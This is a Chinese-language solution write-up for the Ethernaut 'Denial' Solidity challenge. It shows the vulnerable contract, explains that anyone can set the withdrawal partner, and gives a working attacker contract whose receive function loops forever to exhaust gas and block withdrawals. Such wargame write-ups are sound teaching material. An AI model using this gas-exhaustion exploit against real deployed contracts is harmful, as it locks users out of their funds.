# Ethernaut 20-Denial

## 本关目标

- 拒绝任何人调用 withdraw

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    // 设置partner,没有限制，任何人都可以调用
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        // 任何人调用了withdraw都会先给partner转账一部分
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## 解决方案

1. 因为在 withdraw 中任何人调用都会先给 partner 转账一部分，所以可以在 partner 合约中设置接受转账时有一个无限循环，消耗完所有 gas 导致 withdraw 调用失败

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Denial.sol";
contract Hack {
    function hack(Denial target) external {
      // 将当前合约设置成partner
        target.setWithdrawPartner(address(this));
        target.withdraw();
    }

    receive() external payable{
      // 接收转账时无限循环消耗gas
        while(true){

        }
    }
}
```
